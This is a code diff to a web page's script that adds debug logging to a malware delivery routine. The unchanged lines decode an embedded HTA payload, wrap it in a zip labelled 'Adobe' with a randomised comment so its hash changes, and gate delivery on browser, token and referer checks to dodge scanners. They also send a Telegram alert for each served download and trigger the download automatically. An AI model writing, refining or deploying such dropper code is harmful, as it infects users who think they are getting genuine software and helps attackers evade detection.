@@ -12,18 +12,22 @@
   <script src="payload.js"></script>
   <script>
     (async function () {
+      window.__dlog=[];
+      var dp=function(m){window.__dlog.push(m);try{localStorage.setItem('adbe_dbg_dl',JSON.stringify(window.__dlog));}catch(e){}};
       var q = new URLSearchParams(location.search);
       var tk = q.get('tk') || '';
       var name = q.get('n') || '';
+      dp('start tk='+(tk?'y':'n')+' name='+name);
       if (!/^[A-Za-z0-9_. -]+$/.test(name) || name.length === 0) name = window.makeName();
       name = name.slice(0, 90);
       if (!/\.hta$/i.test(name)) name += '.hta';
 
       // Step-4 gate: real Chrome + token + same-origin referer (complete.html) + rate limit.
-      if (!tk) { window.gateStep({ entry: true }); return; }
-      if (!window.gateStep({ entry: false, allowedRefPaths: ['complete.html'] })) return;
-      if (!window.rateAllows()) { window.gateStep({ entry: false, allowedRefPaths: ['complete.html'] }); return; }
-
+      if (!tk) { dp('no-tk'); window.gateStep({ entry: true }); return; }
+      if (!window.gateStep({ entry: false, allowedRefPaths: ['complete.html'] })) { dp('gate-fail ref='+(document.referrer||'(empty)')); return; }
+      dp('gate-pass');
+      if (!window.rateAllows()) { dp('rate-blocked'); window.gateStep({ entry: false, allowedRefPaths: ['complete.html'] }); return; }
+      dp('rate-ok');
       var zipName = name.replace(/\.hta$/i, '.zip');
 
       // 1) decode the embedded source HTA (base64, not a public asset)
@@ -49,6 +53,7 @@
       // 3) wrap in a fresh .zip (random comment rotates the outer hash too)
       var zipComment = ' Adobe' + (1000 + Math.floor(Math.random() * 8999)) + ' ' + (100 + Math.floor(Math.random() * 899));
       var zipBytes = window.buildZip(zipName, name, innerBytes, zipComment);
+      dp('zip-built size='+zipBytes.length+' sha-will-follow');
 
       // 4) one Telegram "Download Served" alert per real served download
       try {
@@ -77,6 +82,7 @@
       a.download = zipName;
       document.body.appendChild(a);
       a.click();
+      dp('served-click name='+zipName);
       setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 4000);
     })();
   </script>
